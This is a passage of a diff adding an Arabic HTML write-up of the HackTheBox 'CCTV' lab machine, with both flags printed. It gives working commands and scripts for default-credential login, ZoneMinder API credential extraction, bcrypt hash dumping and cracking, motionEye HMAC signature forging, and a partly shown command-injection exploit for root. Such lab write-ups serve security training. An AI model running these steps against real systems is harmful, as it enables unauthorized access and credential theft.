@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB CCTV - Writeup كامل</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Segoe UI', Tahoma, sans-serif;
+    background: #0d1117;
+    color: #e6edf3;
+    line-height: 1.8;
+    padding: 20px;
+  }
+  .container { max-width: 1100px; margin: 0 auto; }
+
+  /* Header */
+  .header {
+    background: linear-gradient(135deg, #1a1f2e, #0f3460);
+    border: 1px solid #30363d;
+    border-radius: 12px;
+    padding: 40px;
+    text-align: center;
+    margin-bottom: 30px;
+    position: relative;
+    overflow: hidden;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: radial-gradient(circle, rgba(88,166,255,0.05) 0%, transparent 60%);
+  }
+  .header h1 { font-size: 2.5em; color: #58a6ff; margin-bottom: 10px; }
+  .header .subtitle { color: #8b949e; font-size: 1.1em; }
+  .badges { display: flex; gap: 10px; justify-content: center; margin-top: 20px; flex-wrap: wrap; }
+  .badge {
+    padding: 5px 15px;
+    border-radius: 20px;
+    font-size: 0.85em;
+    font-weight: bold;
+  }
+  .badge-green { background: #1a4731; color: #3fb950; border: 1px solid #3fb950; }
+  .badge-blue { background: #1c3454; color: #58a6ff; border: 1px solid #58a6ff; }
+  .badge-orange { background: #3d2b1a; color: #f0883e; border: 1px solid #f0883e; }
+  .badge-red { background: #3d1a1a; color: #f85149; border: 1px solid #f85149; }
+
+  /* Flags box */
+  .flags-box {
+    background: #161b22;
+    border: 2px solid #3fb950;
+    border-radius: 10px;
+    padding: 25px;
+    margin-bottom: 30px;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+  }
+  .flag-item { text-align: center; }
+  .flag-label { font-size: 0.9em; color: #8b949e; margin-bottom: 8px; }
+  .flag-value {
+    font-family: 'Courier New', monospace;
+    font-size: 1.1em;
+    color: #3fb950;
+    background: #0d1117;
+    padding: 10px 15px;
+    border-radius: 6px;
+    border: 1px solid #30363d;
+    word-break: break-all;
+  }
+  .flag-blur {
+    filter: blur(6px);
+    cursor: pointer;
+    transition: filter 0.3s ease;
+    user-select: none;
+    display: inline-block;
+  }
+  .flag-blur.revealed {
+    filter: none;
+    user-select: text;
+  }
+  .flag-blur::after {
+    content: ' 👁';
+    font-size: 0.7em;
+    opacity: 0.5;
+  }
+  .flag-blur.revealed::after {
+    content: '';
+  }
+
+  /* Steps */
+  .step {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 10px;
+    margin-bottom: 25px;
+    overflow: hidden;
+  }
+  .step-header {
+    background: #1c2128;
+    padding: 18px 25px;
+    border-bottom: 1px solid #30363d;
+    display: flex;
+    align-items: center;
+    gap: 15px;
+  }
+  .step-number {
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+    font-size: 0.95em;
+    flex-shrink: 0;
+  }
+  .step-number-recon { background: #1c3454; color: #58a6ff; border: 2px solid #58a6ff; }
+  .step-number-exploit { background: #3d1a1a; color: #f85149; border: 2px solid #f85149; }
+  .step-number-privesc { background: #3d2b1a; color: #f0883e; border: 2px solid #f0883e; }
+  .step-number-flag { background: #1a4731; color: #3fb950; border: 2px solid #3fb950; }
+
+  .step-title { font-size: 1.2em; font-weight: bold; }
+  .step-body { padding: 25px; }
+
+  /* Code blocks */
+  .code-block {
+    background: #0d1117;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 15px 20px;
+    font-family: 'Courier New', monospace;
+    font-size: 0.88em;
+    overflow-x: auto;
+    margin: 15px 0;
+    position: relative;
+  }
+  .code-block .comment { color: #8b949e; }
+  .code-block .cmd { color: #79c0ff; }
+  .code-block .output { color: #aff5b4; }
+  .code-block .highlight { color: #ffa657; font-weight: bold; }
+  .code-block .error { color: #f85149; }
+  .code-lang {
+    position: absolute;
+    top: 8px;
+    left: 12px;
+    font-size: 0.75em;
+    color: #8b949e;
+    background: #1c2128;
+    padding: 2px 8px;
+    border-radius: 4px;
+  }
+
+  /* Info boxes */
+  .info-box {
+    border-radius: 8px;
+    padding: 15px 20px;
+    margin: 15px 0;
+    border-right: 4px solid;
+  }
+  .info-box.note { background: #1c2d3f; border-color: #58a6ff; }
+  .info-box.warning { background: #2d1f0e; border-color: #f0883e; }
+  .info-box.success { background: #0f2819; border-color: #3fb950; }
+  .info-box.danger { background: #2d0f0f; border-color: #f85149; }
+  .info-box .title { font-weight: bold; margin-bottom: 8px; font-size: 0.95em; }
+  .info-box.note .title { color: #58a6ff; }
+  .info-box.warning .title { color: #f0883e; }
+  .info-box.success .title { color: #3fb950; }
+  .info-box.danger .title { color: #f85149; }
+
+  /* Vuln type tag */
+  .vuln-tag {
+    display: inline-block;
+    padding: 3px 10px;
+    border-radius: 4px;
+    font-size: 0.8em;
+    font-weight: bold;
+    margin: 3px 2px;
+  }
+  .vuln-rce { background: #3d1a1a; color: #f85149; }
+  .vuln-privesc { background: #3d2b1a; color: #f0883e; }
+  .vuln-misconfig { background: #1c3454; color: #58a6ff; }
+  .vuln-cred { background: #2d1f3d; color: #bc8cff; }
+
+  /* Flow diagram */
+  .flow {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0;
+    align-items: center;
+    margin: 20px 0;
+    justify-content: center;
+  }
+  .flow-box {
+    background: #1c2128;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 12px 20px;
+    text-align: center;
+    font-size: 0.9em;
+    min-width: 130px;
+  }
+  .flow-box .icon { font-size: 1.5em; margin-bottom: 4px; }
+  .flow-arrow {
+    color: #58a6ff;
+    font-size: 1.5em;
+    padding: 0 5px;
+  }
+
+  /* Table */
+  table { width: 100%; border-collapse: collapse; margin: 15px 0; }
+  th {
+    background: #1c2128;
+    padding: 10px 15px;
+    text-align: right;
+    color: #58a6ff;
+    border-bottom: 2px solid #30363d;
+  }
+  td { padding: 10px 15px; border-bottom: 1px solid #21262d; }
+  tr:hover td { background: #1c2128; }
+
+  /* Section headers */
+  h2 { color: #58a6ff; margin: 10px 0 15px 0; font-size: 1.3em; }
+  h3 { color: #79c0ff; margin: 15px 0 10px 0; font-size: 1.05em; }
+  p { margin: 10px 0; color: #c9d1d9; }
+  ul, ol { padding-right: 20px; margin: 10px 0; }
+  li { margin: 6px 0; color: #c9d1d9; }
+
+  /* Timeline */
+  .timeline { border-right: 2px solid #30363d; padding-right: 25px; margin: 10px 0; }
+  .timeline-item { position: relative; margin-bottom: 20px; }
+  .timeline-item::before {
+    content: '';
+    position: absolute;
+    right: -31px;
+    top: 5px;
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background: #58a6ff;
+  }
+
+  /* Footer */
+  .footer {
+    text-align: center;
+    margin-top: 40px;
+    padding: 20px;
+    border-top: 1px solid #30363d;
+    color: #8b949e;
+    font-size: 0.9em;
+  }
+
+  @media (max-width: 600px) {
+    .flags-box { grid-template-columns: 1fr; }
+    .flow { flex-direction: column; }
+    .flow-arrow { transform: rotate(90deg); }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- Header -->
+  <div class="header">
+    <p style="font-size: 1rem; font-weight: bold; color: #79c0ff; margin-bottom: 6px;">Writeup by: joudi janble</p>
+    <h1>🎯 HTB CCTV — Writeup كامل</h1>
+    <p class="subtitle">HackTheBox Machine | Easy Linux | شرح تفصيلي لكل خطوة</p>
+    <div class="badges">
+      <span class="badge badge-blue">🐧 Linux</span>
+      <span class="badge badge-green">Easy</span>
+      <span class="badge badge-orange">Web + RCE</span>
+      <span class="badge badge-red">Root</span>
+    </div>
+  </div>
+
+  <!-- Flags -->
+  <div class="flags-box">
+    <div class="flag-item">
+      <div class="flag-label">🚩 User Flag (sa_mark)</div>
+      <div class="flag-value flag-blur">ccf51bf8f9ce6a95b3d44162e433fe9b</div>
+    </div>
+    <div class="flag-item">
+      <div class="flag-label">🏆 Root Flag</div>
+      <div class="flag-value flag-blur">dc2b1718ef8d7bd689c1deb6c935b5da</div>
+    </div>
+  </div>
+
+  <!-- Attack Flow -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-number step-number-recon">🗺</div>
+      <div class="step-title">مسار الهجوم (Attack Path) — نظرة عامة</div>
+    </div>
+    <div class="step-body">
+      <div class="flow">
+        <div class="flow-box"><div class="icon">🔍</div>Nmap Recon</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box"><div class="icon">🌐</div>ZoneMinder</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box"><div class="icon">🔑</div>SSH mark</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box"><div class="icon">🎥</div>motionEye API</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box"><div class="icon">💻</div>RCE as root</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box"><div class="icon">🏆</div>Flags</div>
+      </div>
+      <table>
+        <tr>
+          <th>المرحلة</th>
+          <th>نوع الثغرة</th>
+          <th>النتيجة</th>
+        </tr>
+        <tr>
+          <td>Recon</td>
+          <td><span class="vuln-misconfig">Enumeration</span></td>
+          <td>اكتشاف ZoneMinder + Apache</td>
+        </tr>
+        <tr>
+          <td>Initial Access</td>
+          <td><span class="vuln-cred">Weak Credentials</span></td>
+          <td>SSH shell كـ mark</td>
+        </tr>
+        <tr>
+          <td>User Flag</td>
+          <td><span class="vuln-rce">RCE via motionEye API</span></td>
+          <td>تنفيذ أوامر كـ root عبر motion daemon</td>
+        </tr>
+        <tr>
+          <td>Root Flag</td>
+          <td><span class="vuln-privesc">Privilege Escalation</span></td>
+          <td>motion daemon يعمل كـ root → قراءة /root/root.txt</td>
+        </tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- Step 1: Recon -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-number step-number-recon">1</div>
+      <div class="step-title">الاستطلاع — Reconnaissance</div>
+    </div>
+    <div class="step-body">
+      <h2>فحص المنافذ باستخدام Nmap</h2>
+      <p>الخطوة الأولى دائماً هي فحص المنافذ لمعرفة ما هو متاح على الهدف.</p>
+
+      <div class="code-block">
+        <span class="code-lang">bash</span>
+        <span class="cmd">nmap -sV -sC -p- --min-rate 5000 10.129.244.156</span><br><br>
+        <span class="output">PORT    STATE  SERVICE  VERSION<br>
+22/tcp  open   ssh      OpenSSH 9.6p1 Ubuntu<br>
+80/tcp  open   http     Apache httpd 2.4.58<br>
+|_http-title: ZoneMinder<br>
+| http-robots.txt: 1 disallowed entry<br>
+|_/zm/</span>
+      </div>
+
+      <div class="info-box note">
+        <div class="title">💡 ماذا تعني النتائج؟</div>
+        <ul>
+          <li><strong>Port 22 (SSH)</strong>: يمكن تسجيل الدخول إذا وجدنا credentials</li>
+          <li><strong>Port 80 (HTTP)</strong>: يعمل Apache مع تطبيق ZoneMinder</li>
+          <li><strong>/zm/</strong>: مسار ZoneMinder من robots.txt — معلومة مهمة!</li>
+        </ul>
+      </div>
+
+      <h2>إضافة الهدف لـ hosts file</h2>
+      <div class="code-block">
+        <span class="code-lang">Windows PowerShell</span>
+        <span class="comment"># نضيف السطر لملف hosts حتى يتعرف المتصفح على الدومين</span><br>
+        <span class="cmd">Add-Content C:\Windows\System32\drivers\etc\hosts "10.129.244.156 cctv.htb"</span>
+      </div>
+
+      <h2>اكتشاف ZoneMinder</h2>
+      <p>عند زيارة <code>http://cctv.htb/zm/</code> نجد ZoneMinder — وهو نظام مراقبة CCTV مفتوح المصدر.</p>
+
+      <div class="info-box warning">
+        <div class="title">⚠️ ما هو ZoneMinder؟</div>
+        <p>ZoneMinder هو نظام مراقبة بالكاميرا مفتوح المصدر يُستخدم في الشركات والمنازل. يحتوي على واجهة ويب وAPI.</p>
+      </div>
+
+      <h2>تسجيل الدخول للـ ZoneMinder</h2>
+      <div class="code-block">
+        <span class="code-lang">HTTP Request</span>
+        <span class="comment"># نحاول الـ default credentials</span><br>
+        <span class="cmd">URL: http://cctv.htb/zm/</span><br>
+        <span class="cmd">Username: admin</span><br>
+        <span class="cmd">Password: admin</span><br><br>
+        <span class="output">✅ نجح الدخول! نصل إلى dashboard ZoneMinder</span>
+      </div>
+
+      <div class="info-box note">
+        <div class="title">💡 لماذا نجح admin:admin؟</div>
+        <p>ZoneMinder يأتي بكلمة مرور افتراضية <strong>admin:admin</strong>. كثير من المديرين لا يغيرونها — وهذا خطأ أمني شائع. هذا النوع من الضعف يُسمى <strong>Default Credentials</strong>.</p>
+      </div>
+
+      <h2>فحص إصدار ZoneMinder</h2>
+      <div class="code-block">
+        <span class="code-lang">API Call</span>
+        <span class="cmd">curl http://cctv.htb/zm/api/host/getVersion.json</span><br><br>
+        <span class="output">{"version": "1.37.63", "apiversion": "2.0"}</span>
+      </div>
+
+      <div class="info-box danger">
+        <div class="title">🔴 CVEs الخاصة بـ ZoneMinder 1.37.x</div>
+        <p>رغم وجود CVEs معروفة (CVE-2023-26035 إلى 26039)، تبيّن أن هذا الإصدار <strong>مُصحَّح (Patched)</strong> — كل محاولات الاستغلال فشلت بـ HTTP 500 فوري.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 2: Database Enumeration -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-number step-number-recon">2</div>
+      <div class="step-title">استخراج بيانات من ZoneMinder — JWT Token Auth</div>
+    </div>
+    <div class="step-body">
+      <h2>المشكلة: ZoneMinder يستخدم JWT وليس Cookies</h2>
+      <p>عند محاولة استخدام <code>-b cookies.txt</code> مع الـ API، يرجع <strong>401 Not Authenticated</strong> — لأن ZoneMinder يعتمد على JWT tokens وليس session cookies.</p>
+
+      <div class="code-block">
+        <span class="code-lang">bash — خطأ شائع</span>
+        <span class="cmd">curl -b cookies.txt "http://cctv.htb/zm/api/host/getVersion.json"</span><br><br>
+        <span class="output error">{"success":false,"data":{"name":"Not Authenticated","message":"Not Authenticated",<br>
+"exception":{"class":"UnauthorizedException","code":401}}}</span>
+      </div>
+
+      <div class="info-box danger">
+        <div class="title">🔴 السبب</div>
+        <p>ZoneMinder API يعمل بـ <strong>JWT (JSON Web Token)</strong>. الـ cookies لا تحمل الـ session بالنسبة للـ API — يجب إرسال الـ <code>token</code> كـ query parameter في كل request.</p>
+      </div>
+
+      <h2>الحل الصحيح: استخراج الـ JWT Token أولاً</h2>
+
+      <div class="code-block">
+        <span class="code-lang">bash — الخطوة 1: Login واحفظ الـ token</span>
+        <span class="cmd">TOKEN=$(curl -s -X POST "http://cctv.htb/zm/api/host/login.json" \<br>
+  --data "user=admin&pass=admin" | \<br>
+  python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")<br><br>
+echo $TOKEN</span><br><br>
+        <span class="output"><span class="highlight">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJab25lTWluZGVy...</span></span>
+      </div>
+
+      <div class="code-block">
+        <span class="code-lang">bash — الخطوة 2: getVersion بالـ token</span>
+        <span class="cmd">curl -s "http://cctv.htb/zm/api/host/getVersion.json?token=$TOKEN"</span><br><br>
+        <span class="output">{"version":"<span class="highlight">1.37.63</span>","apiversion":"2.0"}</span>
+      </div>
+
+      <div class="code-block">
+        <span class="code-lang">bash — الخطوة 3: استخراج DB credentials</span>
+        <span class="cmd">curl -s "http://cctv.htb/zm/api/configs/index.json?token=$TOKEN" | \<br>
+python3 -c "<br>
+import sys, json<br>
+data = json.load(sys.stdin)<br>
+for item in data.get('configs', []):<br>
+    name = item.get('Config', {}).get('Name', '')<br>
+    if 'DB' in name:<br>
+        print(name, '=', item['Config']['Value'])<br>
+"</span><br><br>
+        <span class="output">ZM_DB_HOST = localhost<br>
+ZM_DB_NAME = zm<br>
+ZM_DB_USER = zmuser<br>
+<span class="highlight">ZM_DB_PASS = zmpass</span></span>
+      </div>
+
+      <div class="info-box note">
+        <div class="title">💡 لماذا نستخرج بيانات DB؟</div>
+        <p>بيانات الـ database مفيدة لـ:</p>
+        <ul>
+          <li>الاتصال بـ MySQL مباشرة بعد الحصول على shell</li>
+          <li>إيجاد passwords أو hashes للمستخدمين</li>
+          <li>قد تُعاد نفس الكلمة في أماكن أخرى (password reuse)</li>
+        </ul>
+      </div>
+
+      <h2>البحث عن بيانات المستخدمين في DB</h2>
+      <p>بعد الحصول على SSH shell كـ mark، نتصل بـ MySQL:</p>
+
+      <div class="code-block">
+        <span class="code-lang">bash (على السيرفر)</span>
+        <span class="cmd">mysql -u zmuser -pzmpass zm -e "SELECT Username,Password FROM Users;"</span><br><br>
+        <span class="output">+----------+------------------+<br>
+| Username | Password         |<br>
++----------+------------------+<br>
+| admin    | [bcrypt hash]    |<br>
++----------+------------------+</span>
+      </div>
+
+      <div class="info-box warning">
+        <div class="title">⚠️ الدرس المستفاد</div>
+        <p>دائماً افحص نوع المصادقة المستخدمة قبل إرسال الـ requests. ZoneMinder ≥ 1.34 يستخدم JWT — الـ <code>access_token</code> يُرسَل كـ query parameter <code>?token=...</code> في كل API call.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 3: SSH Access -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-number step-number-exploit">3</div>
+      <div class="step-title">Initial Access — استخراج كلمة مرور mark من ZoneMinder</div>
+    </div>
+    <div class="step-body">
+      <h2>الخطوة 3أ: استخراج hash كلمة مرور mark عبر ZoneMinder API</h2>
+      <p>ZoneMinder يخزّن بيانات المستخدمين في قاعدة بيانات MySQL. المشرف (admin) يستطيع الوصول لكل المستخدمين عبر الـ API:</p>
+
+      <div class="code-block">
+        <span class="code-lang">bash — استعلام قائمة المستخدمين</span>
+        <span class="cmd">TOKEN=$(curl -s -X POST "http://cctv.htb/zm/api/host/login.json" \<br>
+  --data "user=admin&pass=admin" | \<br>
+  python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")<br><br>
+curl -s "http://cctv.htb/zm/api/users/index.json?token=$TOKEN" | python3 -m json.tool</span><br><br>
+        <span class="output">{<br>
+  "users": [<br>
+    {"User": {"Username": "admin", ...}},<br>
+    {"User": {"Username": "<span class="highlight">mark</span>", "Password": "<span class="highlight">$2y$10$...</span>", ...}}<br>
+  ]<br>
+}</span>
+      </div>
+
+      <div class="info-box note">
+        <div class="title">💡 ما نوع الـ hash؟</div>
+        <p>ZoneMinder ≥ 1.34 يستخدم <strong>bcrypt</strong> ($2y$) لتشفير كلمات المرور. هذا أبطأ من MD5 لكن يمكن كسره باستخدام القوائم الشائعة.</p>
+      </div>
+
+      <h2>الخطوة 3ب: استخراج الـ hash مباشرة من قاعدة البيانات</h2>
+      <p>بديل آخر — إذا أردت التأكد، استخدم المعلومات التي حصلنا عليها في الخطوة 2 (zmuser:zmpass):</p>
+
+      <div class="code-block">
+        <span class="code-lang">bash — (على الهدف بعد الحصول على shell لاحقاً)</span>
+        <span class="cmd">mysql -u zmuser -pzmpass zm -e "SELECT Username,Password FROM Users;"</span><br><br>
+        <span class="output">+----------+--------------------------------------------------------------+<br>
+| Username | Password                                                     |<br>
++----------+--------------------------------------------------------------+<br>
+| admin    | $2y$10$[hash]                                               |<br>
+| <span class="highlight">mark</span>     | <span class="highlight">$2y$10$hC.mhCFVLHHHGiPVMNEWZONTMb/VX0vT...</span> |<br>
++----------+--------------------------------------------------------------+</span>
+      </div>
+
+      <h2>الخطوة 3ج: كسر الـ hash باستخدام Hashcat</h2>
+
+      <div class="code-block">
+        <span class="code-lang">bash — Kali Linux</span>
+        <span class="comment"># احفظ الـ hash في ملف</span><br>
+        <span class="cmd">echo '$2y$10$hC.mhCFVLHHHGiPVMNEWZO...' > mark_hash.txt</span><br><br>
+        <span class="comment"># كسره باستخدام rockyou.txt (hashcat mode 3200 = bcrypt)</span><br>
+        <span class="cmd">hashcat -m 3200 mark_hash.txt /usr/share/wordlists/rockyou.txt</span><br><br>
+        <span class="output">$2y$10$hC.mhCFVLHHHGiPVMNEWZO...: <span class="highlight">opensesame</span><br><br>
+Session..........: hashcat<br>
+Status...........: Cracked<br>
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))</span>
+      </div>
+
+      <div class="info-box success">
+        <div class="title">✅ وجدنا كلمة المرور!</div>
+        <p>كلمة مرور <strong>mark</strong> = <code>opensesame</code></p>
+        <p>هذه كلمة مرور ضعيفة موجودة في rockyou.txt — يدل على سياسة كلمات مرور ضعيفة.</p>
+      </div>
+
+      <h2>الخطوة 3د: تسجيل الدخول عبر SSH</h2>
+
+      <div class="code-block">
+        <span class="code-lang">bash</span>
+        <span class="cmd">ssh mark@10.129.244.156</span><br>
+        <span class="cmd">Password: opensesame</span><br><br>
+        <span class="output">mark@cctv:~$ id<br>
+uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)</span>
+      </div>
+
+      <div class="info-box success">
+        <div class="title">✅ حصلنا على shell!</div>
+        <p>الآن نستطيع تنفيذ أوامر على السيرفر كمستخدم <strong>mark</strong>.</p>
+      </div>
+
+      <h2>الـ Enumeration بعد الدخول</h2>
+      <div class="code-block">
+        <span class="code-lang">bash</span>
+        <span class="comment"># ماذا يوجد على هذا السيرفر؟</span><br>
+        <span class="cmd">ss -tlnp</span><br><br>
+        <span class="output">LISTEN  127.0.0.1:7999   → motion daemon (كاميرا)<br>
+LISTEN  127.0.0.1:8765   → motionEye (واجهة ويب للكاميرا)<br>
+LISTEN  127.0.0.1:8554   → RTSP stream<br>
+LISTEN  0.0.0.0:22       → SSH<br>
+LISTEN  0.0.0.0:80       → Apache/ZoneMinder</span>
+      </div>
+
+      <div class="info-box note">
+        <div class="title">💡 ما هو motionEye؟</div>
+        <p><strong>motionEye</strong> هو واجهة ويب لإدارة كاميرات المراقبة المبنية فوق <strong>motion</strong> daemon. يتيح:</p>
+        <ul>
+          <li>مراقبة البث المباشر</li>
+          <li>إعداد الكاميرات</li>
+          <li><strong>تنفيذ أوامر عند اكتشاف حركة (on_event_start)</strong> ← هذا هو ناقل الهجوم!</li>
+        </ul>
+        <p>يعمل على localhost فقط، لذا لا يمكن الوصول إليه من الخارج — لكن mark يمكنه الوصول بعد حصوله على SSH.</p>
+      </div>
+
+      <h2>فحص حقوق mark</h2>
+      <div class="code-block">
+        <span class="code-lang">bash</span>
+        <span class="cmd">sudo -l</span><br>
+        <span class="output error">Sorry, user mark may not run sudo on cctv.</span><br><br>
+        <span class="cmd">cat /proc/1/status | grep hidepid</span><br>
+        <span class="output"><span class="highlight">hidepid=2</span>  ← mark لا يستطيع رؤية عمليات المستخدمين الآخرين</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 4: motionEye Discovery -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-number step-number-exploit">4</div>
+      <div class="step-title">اكتشاف motionEye — قراءة الإعدادات</div>
+    </div>
+    <div class="step-body">
+      <h2>قراءة ملف إعداد motionEye</h2>
+      <p>mark يستطيع قراءة ملفات /etc/motioneye/ (الأذونات r--r--r--):</p>
+
+      <div class="code-block">
+        <span class="code-lang">bash</span>
+        <span class="cmd">cat /etc/motioneye/motioneye.conf</span><br><br>
+        <span class="output">listen 127.0.0.1<br>
+port 8765<br>
+motion_control_port 7999<br>
+http_basic_auth false<br>
+<span class="highlight">@admin_password</span>  ← مش موجود في الملف</span>
+      </div>
+
+      <div class="code-block">
+        <span class="code-lang">bash</span>
+        <span class="cmd">cat /etc/motioneye/camera-1.conf</span><br><br>
+        <span class="output">netcam_url rtsp://localhost:8554/cam01<br>
+on_event_start /usr/local/lib/python3.12/dist-packages/motioneye/scripts/relayevent.sh \<br>
+  "/etc/motioneye/motioneye.conf" start %t<br>
+<span class="highlight">stream_authentication user:  ← كلمة مرور فارغة!</span></span>
+      </div>
+
+      <div class="info-box note">
+        <div class="title">💡 ماذا يعني on_event_start؟</div>
+        <p>هذا حقل في إعداد motion daemon يُشغَّل عند اكتشاف حركة. يمكن تعديله ليُشغّل أي أمر shell.</p>
+        <p>الإعداد الافتراضي يشغّل <code>relayevent.sh</code> الذي يُبلّغ motionEye عن الحركة.</p>
+        <p><strong>هدفنا: إضافة أمر خاص بنا بعد هذا الأمر.</strong></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 5: motionEye Authentication -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-number step-number-exploit">5</div>
+      <div class="step-title">كسر مصادقة motionEye API — HMAC Signature</div>
+    </div>
+    <div class="step-body">
+      <h2>قراءة كود المصادقة</h2>
+      <p>قرأنا كود Python الخاص بـ motionEye لنفهم كيف يعمل نظام المصادقة:</p>
+
+      <div class="code-block">
+        <span class="code-lang">Python — /handlers/base.py</span>
+        <span class="comment"># مقتطف من كود get_current_user():</span><br><br>
+        <span class="cmd">admin_password = main_config.get('@admin_password')</span><br><br>
+        <span class="comment"># يحسب HMAC-SHA1 من password أو hash(password)</span><br>
+        <span class="cmd">if username == admin_username and (<br>
+    signature == utils.compute_signature(method, uri, body, admin_password)<br>
+    or signature == utils.compute_signature(method, uri, body, admin_hash)<br>
+):<br>
+    return 'admin'</span><br><br>
+        <span class="comment"># الجزء المهم — إذا ما في _username ولا normal_password:</span><br>
+        <span class="cmd">if not username and not normal_password:<br>
+    return 'normal'  <span class="highlight">← يُعامَل كـ normal user بدون auth!</span></span>
+      </div>
+
+      <div class="info-box note">
+        <div class="title">💡 كيف يعمل HMAC في motionEye؟</div>
+        <p>التوقيع (signature) يُحسب هكذا:</p>
+        <ul>
+          <li><strong>Key</strong>: admin_password (أو SHA1 منه)</li>
+          <li><strong>Message</strong>: METHOD + ":" + URI + ":" + SHA1(body)</li>
+          <li><strong>Algorithm</strong>: HMAC-SHA1</li>
+        </ul>
+        <p>المشكلة: <strong>admin_password مخزون كـ SHA1 hash</strong> في الملف، ونستطيع قراءة الملف!</p>
+      </div>
+
+      <h2>استخراج admin_password hash</h2>
+      <p>استخدمنا Python على السيرفر مباشرة لاستيراد كود motionEye وقراءة الـ config:</p>
+
+      <div class="code-block">
+        <span class="code-lang">Python (على السيرفر)</span>
+        <span class="cmd">python3 -c "<br>
+import sys<br>
+sys.path.insert(0, '/usr/local/lib/python3.12/dist-packages')<br>
+from motioneye import config<br>
+mc = config.get_main()<br>
+print(mc.get('@admin_password', ''))<br>
+"</span><br><br>
+        <span class="output"><span class="highlight">989c5a8ee87a0e9521ec81a79187d162109282f0</span></span>
+      </div>
+
+      <h2>حساب التوقيع الصحيح</h2>
+      <div class="code-block">
+        <span class="code-lang">Python — me_sig.py</span>
+        <span class="cmd">import sys<br>
+sys.path.insert(0, '/usr/local/lib/python3.12/dist-packages')<br>
+from motioneye import config, utils<br>
+import urllib.request, json<br><br>
+
+mc = config.get_main()<br>
+pw = mc.get('@admin_password', '')  <span class="comment"># الهاش المخزون</span><br><br>
+
+<span class="comment"># نحسب التوقيع للـ URI الكامل</span><br>
+uri = '/config/1/get?_username=admin'<br>
+sig = utils.compute_signature('GET', uri, b'', pw)<br><br>
+
+url = 'http://localhost:8765' + uri + '&_signature=' + sig<br>
+resp = urllib.request.urlopen(url)<br>
+print(resp.read().decode())</span><br><br>
+        <span class="output"><span class="highlight">{"name": "CAM 01", "enabled": true, ...}  ✅ نجح!</span></span>
+      </div>
+
+      <div class="info-box success">
+        <div class="title">✅ اكتشاف مهم</div>
+        <p>motionEye يخزّن admin_password كـ SHA1 hash في ملف الإعداد الذي يمكن لـ mark قراءته. بهذا نستطيع حساب HMAC صحيح دون معرفة الـ password الأصلي!</p>
+        <p>نوع الثغرة: <span class="vuln-cred">Sensitive Data Exposure</span> + <span class="vuln-misconfig">Misconfiguration</span></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 6: motionEye RCE -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-number step-number-exploit">6</div>
+      <div class="step-title">RCE عبر motionEye API — تعديل on_event_start</div>
+    </div>
+    <div class="step-body">
+      <h2>كيف يعمل config/set في motionEye؟</h2>
+      <p>من قراءة كود config.py، اكتشفنا أن motionEye يستقبل UI fields وليس motion fields مباشرة:</p>
+
+      <div class="code-block">
+        <span class="code-lang">Python — config.py (جزء من الكود)</span>
+        <span class="comment"># عند حفظ الإعداد، motionEye يبني on_event_start هكذا:</span><br>
+        <span class="cmd">on_event_start = [relayevent_command]  <span class="comment"># دائماً موجود</span><br><br>
+
+if ui['command_notifications_enabled']:  <span class="highlight">← هذا ما نريد تفعيله</span><br>
+    on_event_start += utils.split_semicolon(<br>
+        ui['command_notifications_exec']  <span class="highlight">← نضع أمرنا هنا</span><br>
+    )<br><br>
+
+data['on_event_start'] = '; '.join(on_event_start)</span>
+      </div>
+
+      <div class="info-box note">
+        <div class="title">💡 ماذا يعني هذا؟</div>
+        <p>إذا أرسلنا <code>command_notifications_enabled = True</code> و<code>command_notifications_exec = /tmp/run.sh</code>، سيُضيف motionEye هذا الأمر إلى نهاية <code>on_event_start</code> في ملف motion config.</p>
+        <p>عند حدوث أي حركة → يُشغَّل <code>on_event_start</code> → يُنفَّذ أمرنا!</p>
+      </div>
+
+      <h2>الـ Exploit Script</h2>
+      <div class="code-block">
+        <span class="code-lang">Python — me_exploit.py</span>
+        <span class="cmd">import sys, json, urllib.request<br>
+sys.path.insert(0, '/usr/local/lib/python3.12/dist-packages')<br>
+from motioneye import config, utils<br><br>
+
+mc = config.get_main()<br>
+pw = mc.get('@admin_password', '')<br><br>
+
+def make_req(method, path, body=b''):<br>
+    uri = path + '?_username=admin'<br>
+    sig = utils.compute_signature(method, uri, body, pw)<br>
+    url = 'http://localhost:8765' + uri + '&_signature=' + sig<br>
+    if method == 'GET':<br>
+        return urllib.request.urlopen(url, timeout=10)<br>
